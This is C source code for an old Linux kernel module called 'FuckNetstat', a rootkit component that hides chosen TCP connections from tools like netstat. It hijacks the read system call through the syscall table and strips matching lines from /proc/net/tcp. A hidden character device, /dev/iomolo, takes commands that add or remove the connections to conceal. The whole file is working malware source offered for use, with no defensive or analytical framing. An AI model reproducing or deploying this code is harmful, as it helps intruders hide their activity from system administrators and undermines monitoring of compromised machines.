/*
 * TILE: FuckNetstat
 *
 * CODER: Ripe
 *
 * DESCR: This LKM may be used to hide connection in a linux system. The
 *        interface to comunicate with LKM is a device... see dev_command()
 *        for usage info :)
 *
 * RECOM: Give me money.
 *
 */


#define __KERNEL__
#define MODULE

#define K_22
//#define K_24

#include <linux/ctype.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/mm.h>
#include <linux/errno.h>

#ifdef K_24
#include <linux/in.h>
#endif /* K_24 */

#include <sys/syscall.h>

extern void *sys_call_table[];

int errno;

typedef struct {
  struct sockaddr_in *local;
  struct sockaddr_in *remote;
  struct laddr *next;
} laddr;

laddr *list_addr=NULL;

int (*o_read)(int, char *, int);

void add_addr(struct sockaddr_in *local, struct sockaddr_in *remote) {
  laddr *ptr=list_addr;
  if (!local && !remote) return;
#ifdef LKM_MSGDEBUGMODE
  if (local) printk("<1>%d.%d.%d.%d:%d", NIPQUAD(local->sin_addr.s_addr), local->sin_port);
  else printk("<1>0.0.0.0:0");
  if (remote) printk("<1> %d.%d.%d.%d:%d", NIPQUAD(remote->sin_addr.s_addr), remote->sin_port);
  else printk("<1> 0.0.0.0:0");  
  printk("<1> added to hide connection list\n");
#endif /* LKM_MSGDEBUGMODE */
  if (is_addr(local, remote)) return;
  if (ptr) {
    while(ptr->next) ptr=(laddr *)ptr->next;
    ptr->next=(struct laddr *)kmalloc(sizeof(laddr), GFP_KERNEL);
    ptr=(laddr *)ptr->next;
  } else {
    list_addr=(laddr *)kmalloc(sizeof(laddr), GFP_KERNEL);
    ptr=list_addr;
  }
  if (local) {
    ptr->local=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
    memcpy(ptr->local, local, sizeof(struct sockaddr_in));
  } else ptr->local=NULL;
  if (remote) {
    ptr->remote=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
    memcpy(ptr->remote, remote, sizeof(struct sockaddr_in));
  }
  ptr->next=NULL;
  return;
}

void del_addr(struct sockaddr_in *local, struct sockaddr_in *remote) {
  laddr *ptr=list_addr, *ptr2;
  if ((!local && !remote) || !ptr) return;
#ifdef LKM_MSGDEBUGMODE
  if (local) printk("<1>%d.%d.%d.%d:%d", NIPQUAD(local->sin_addr.s_addr), local->sin_port);
  else printk("<1>0.0.0.0:0");
  if (remote) printk("<1> %d.%d.%d.%d:%d", NIPQUAD(remote->sin_addr.s_addr), remote->sin_port);
  else printk("<1> 0.0.0.0:0");  
  printk("<1> removed from hide connection list\n");
#endif /* LKM_MSGDEBUGMODE */
  if (!memcmp(local, ptr->local, sizeof(struct sockaddr_in)) && !memcmp(remote, ptr->remote, sizeof(struct sockaddr_in))) {
    list_addr=(laddr *)ptr->next;
    if (ptr->local) kfree(ptr->local);
    if (ptr->remote) kfree(ptr->remote);
    kfree(ptr);
    goto ret;
  }
  while(ptr) {
    if (!memcmp(local, ptr->local, sizeof(struct sockaddr_in)) && !memcmp(remote, ptr->remote, sizeof(struct sockaddr_in))) break;
    ptr2=ptr;
    ptr=(laddr *)ptr->next;
  }
  if (ptr) {
    ptr2->next=ptr->next;
    if (ptr->local) kfree(ptr->local);
    if (ptr->remote) kfree(ptr->remote);
    kfree(ptr);
  }
ret:
  return;
}

int is_addr(struct sockaddr_in *local, struct sockaddr_in *remote) {
  laddr *ptr=list_addr;
  int ret=0;
  while(ptr) {
    if (!memcmp(local, ptr->local, sizeof(struct sockaddr_in)) && !memcmp(remote, ptr->remote, sizeof(struct sockaddr_in))) {  
      ret=1;
      goto ret;
    }
    ptr=(laddr *)ptr->next;
  }
ret:
  return(ret);
}

int hide_connection(struct sockaddr_in *local, struct sockaddr_in *remote) {
  laddr *ptr=list_addr;
  int ret=0;
  if (!ptr) goto ret;
  while(ptr) {
    if (hideme(local, remote, ptr)) {
      ret=1;
      goto ret;
    }
    ptr=(laddr *)ptr->next;
  }
ret:
  return(ret);
}

int hideme(struct sockaddr_in *local, struct sockaddr_in *remote, laddr *ptr) {
  int l=0;
  int r=0;
  if (ptr->local) { 
    if (!memcmp(local, ptr->local, sizeof(struct sockaddr_in))) l=1;
    else goto ret;
  } else l=1;
  if (ptr->remote) {
   if (!memcmp(remote, ptr->remote, sizeof(struct sockaddr_in))) r=1;
   else goto ret;
  } else r=1;
ret:
  if (l && r) return(1);
  else return(0);
} 

unsigned int strtoargs(char *buf, char ***argv) {
  char *ptr;
  char **margv;
  int *nchs=NULL;
  int len=strlen(buf)+1;
  int i;
  int w;
  int argc=0;
  for (i=0 ; i<len ; i++) if (buf[i]==' ' || buf[i]==0) argc++;
  nchs=(int *)kmalloc(argc*sizeof(int), GFP_KERNEL);
  margv=(char **)kmalloc(argc*sizeof(char *), GFP_KERNEL);
  memset(nchs, 0, argc*sizeof(int));
  memset(margv, 0, argc*sizeof(char *));
    w=0;
    for (i=0 ; i<len ; i++) {
      if (buf[i]==' ' || buf[i]==0) {
      w++;
      continue;
      }
    nchs[w]++;
    }
  ptr=buf;
  for (i=0 ; i<argc ; i++) {
    margv[i]=(char *)kmalloc(nchs[i]+1, GFP_KERNEL);
    memset(margv[i], 0, nchs[i]+1);
    strncpy(margv[i], ptr, nchs[i]);
    ptr += (nchs[i]+1);
  }
  margv[argc-1][nchs[argc-1]-1]=0;
  *(argv)=margv;
  return(argc);
}

int atoi(char *str) {
  int res=0;
  int mul=1;
  char *ptr;
  for (ptr=str+strlen(str)-1 ; ptr>=str ; ptr--) {
    if (*ptr < '0' || *ptr > '9') return(-1);
    res+=(*ptr-'0')*mul;
    mul*=10;
  }
  return (res);
}

int inet_aton(const char *cp, struct in_addr *addr) {
  register u_long val;
  register int base, n;
  u_int parts[4];
  register u_int *pp = parts;
  for (;;) {
    if (*cp == '0') {
      if (*++cp == 'x' || *cp == 'X') base = 16, cp++;
      else base = 8;
    } else base = 10;
    val = simple_strtoul (cp, (char **) &cp, base);
    if (val == ULONG_MAX) return 0;
    if (*cp == '.') {
      if (pp >= parts + 3 || val > 0xff) return (0);
      *pp++ = val, cp++;
    } else break;
  }
  if (*cp && (!isascii(*cp) || !isspace(*cp))) return (0);
  n = pp - parts + 1;
  switch (n) {
  case 1:
      break;
  case 2:
      if (val > 0xffffff) return (0);
      val |= parts[0] << 24;
      break;
  case 3:
      if (val > 0xffff) return (0);
      val |= (parts[0] << 24) | (parts[1] << 16);
      break;
  case 4:
      if (val > 0xff) return (0);
      val |= (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8);
      break;
  }
  if (addr) addr->s_addr = htonl(val);
  return (1);
}

unsigned long inet_addr(const char *cp) {
  struct in_addr val;
  if (inet_aton(cp, &val))
    return (val.s_addr);
  return (0);
}

void strtosockaddr(char *ip_port, struct sockaddr_in *saddr) {
  char *ip=ip_port;
  char *port;
  int len=strlen(ip_port);
  int i;
  for(i=0 ; i<len && *(ip_port+i)!=':' ; i++);
  *(ip_port+i)=0;
  port=ip_port+i+1;
  memset(saddr, 0, sizeof(struct sockaddr_in));
  saddr->sin_addr.s_addr=inet_addr(ip);
  saddr->sin_port=atoi(port);
}



#define NO_HIDE 0
#define TCP	1

int my_read(int fd, char *buf, int count) {
  char *kbuf;
  char *kbuf2;
  char *tmp;
  char line[1024];
  int hide=NO_HIDE;
  int off=0;
  int off2=0;
  int o_ret;
  int ret=0;
  int lsize;
  struct sockaddr_in local_addr;
  struct sockaddr_in remote_addr;
  o_ret=(*o_read)(fd, buf, count);
  if (!strcmp(current->files->fd[fd]->f_dentry->d_iname, "tcp")) hide=TCP;
  if (hide==NO_HIDE || count<1 || count>10000) {
    ret=o_ret;
    goto ret;
  }
  kbuf=(char *)kmalloc(count+1, GFP_KERNEL);
  memset(kbuf, 0, count+1);
  kbuf2=(char *)kmalloc(count+1, GFP_KERNEL);
  memset(kbuf2, 0, count+1);
  __generic_copy_from_user(kbuf, buf, o_ret);
  while(off<o_ret) {
    lsize=0;
    memset(line, 0, sizeof(line));
    while(lsize<sizeof(line) && off<o_ret) {
      line[lsize++]=kbuf[off++];
      if (kbuf[off-1]=='\n') break;
    }
    if (hide==TCP) {
      if (strncmp(line, "  sl", 4)) {
	memset(&local_addr, 0, sizeof(struct sockaddr_in));
	memset(&remote_addr, 0, sizeof(struct sockaddr_in));
        tmp=(char *)&line[6];
        local_addr.sin_addr.s_addr=simple_strtoul(tmp, NULL, 16);
        tmp=(char *)&line[20];
        remote_addr.sin_addr.s_addr=simple_strtoul(tmp, NULL, 16);
	tmp=(char *)&line[15];
	local_addr.sin_port=(unsigned int)simple_strtoul(tmp, NULL, 16);
	tmp=(char *)&line[29];
	remote_addr.sin_port=(unsigned int)simple_strtoul(tmp, NULL, 16);
        if (hide_connection(&local_addr, &remote_addr)) continue;
      }
    }
    memcpy(kbuf2+off2, line, lsize);
    off2+=lsize;
    ret+=lsize;
  }
  __generic_copy_to_user(buf, kbuf2, o_ret);
  kfree(kbuf);
  kfree(kbuf2);
ret:
  return(ret);
}


#define makedev(major, minor) ((((uint) major & 0xFF) << 8) | ((uint) minor & 0xFF))

int mn;

int dev_busy=0;
static spinlock_t dev_busy_lock=SPIN_LOCK_UNLOCKED;

static inline _syscall3 (int, mknod, char *, path, mode_t, mode, dev_t, dev);
static inline _syscall1 (int, unlink, char *, path);

void dev_command(int, char **); /* FIXME: temporal (pereza rlz!) */

ssize_t fog2_dev_write(struct file *f, const char *buf, size_t len, loff_t *offset) {
  unsigned int argc;
  char **argv;
  char *mbuf=(char *)kmalloc(len+1, GFP_KERNEL);
  memset(mbuf, 0, len+1);
  memcpy(mbuf, buf, len);
  argc=strtoargs(mbuf, &argv);
  if (argc) dev_command(argc, argv);
  kfree(mbuf);
  return(len);
}
   
int fog2_dev_open(struct inode *i, struct file *f) {
  int ret=0;
  spin_lock(&dev_busy_lock);
  if (dev_busy) {
    ret=-1;
    goto ret;
  }
#ifdef LKM_MSGDEBUGMODE
  printk("<1>Device opened\n");
#endif /* LKM_MSGDEBUGMODE */
#ifndef LKM_DEBUGMODE
  MOD_INC_USE_COUNT;
#endif /* LKM_DEBUGMODE */
  dev_busy++;
  spin_unlock(&dev_busy_lock);
ret:
  return(0);
}

int fog2_dev_release(struct inode *i, struct file *f) {
#ifdef LKM_MSGDEBUGMODE
  printk("<1>Device closed\n");
#endif /* LKM_MSGDEBUGMODE */
#ifndef LKM_DEBUGMODE
  MOD_DEC_USE_COUNT;
#endif /* LKM_DEBUGMODE */
  spin_lock(&dev_busy_lock);
  dev_busy--;
  spin_unlock(&dev_busy_lock);
  return(0);
}

struct file_operations fops = {
#ifdef K_24
  NULL,                       /* owner */
#endif /* K_24 */
  NULL,                       /* llseek */
  NULL,                       /* read */
  (void *)fog2_dev_write,     /* write */
  NULL,                       /* readdir */
  NULL,                       /* poll */
  NULL,                       /* ioctl */
  NULL,                       /* mmap */
  (void *)fog2_dev_open,      /* open */
  NULL,                       /* flush */
  (void *)fog2_dev_release,   /* release */
  NULL,                       /* fsync */
  NULL,                       /* fasync */
#ifdef K_22
  NULL,                       /* check_media_change */
  NULL,                       /* revalidate */
  NULL                        /* lock */
#endif /* K_22 */
#ifdef K_24
  NULL,                       /* lock */
  NULL,                       /* readv */
  NULL                        /* writev */
#endif /* K_24 */
};
     
     
void dev_command(int argc, char **argv) {
  int i;
  int len=0;
  char *log;
  char *ptr;
  struct sockaddr_in *local=NULL;
  struct sockaddr_in *remote=NULL;
  if (!strcmp(argv[0], "add")) {
    if (argc<2) return;
    if (!strcmp(argv[1], "addr")) {
      if (argc<4) return;
      if (strcmp(argv[2], "none")) {
	local=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
	strtosockaddr(argv[2], local);
      }
      if (strcmp(argv[3], "none")) {
         remote=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
         strtosockaddr(argv[3], remote);
      }
      add_addr(local, remote);
      kfree(local);
      kfree(remote);
    }
  }
  if (!strcmp(argv[0], "del")) {
    if (argc<2) return;
    if (!strcmp(argv[1], "addr")) {
      if (argc<4) return;
      if (strcmp(argv[2], "none")) {
	local=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
	strtosockaddr(argv[2], local);
      }
      if (strcmp(argv[3], "none")) {
         remote=(struct sockaddr_in *)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
         strtosockaddr(argv[3], remote);
      }
      del_addr(local, remote);
      kfree(local);
      kfree(remote);
    }
  }
  return;
}

#define LKM_DEVICE "/dev/iomolo"

int _dev_create(void) {
  int ret;
  long tmp;
  if ((mn=register_chrdev(mn, "fog2", &fops))<0) return(-1);
  tmp=current->addr_limit.seg;
  current->addr_limit.seg=0xFFFFFFFF;
  ret=mknod(LKM_DEVICE, S_IFCHR|0600, makedev(mn,0));
  current->addr_limit.seg=tmp;
  return(ret);
}
  
void _dev_delete(void) {
  long tmp;
  tmp=current->addr_limit.seg;
  current->addr_limit.seg=0xFFFFFFFF;
  unlink(LKM_DEVICE);
  current->addr_limit.seg=tmp;
  unregister_chrdev(mn, "fog2");
}

int init_module() {
  _dev_create();
  o_read=sys_call_table[__NR_read];
  sys_call_table[__NR_read]=my_read;
  return(0);
}

void cleanup_module() {
  _dev_delete();
  sys_call_table[__NR_read]=o_read;
}
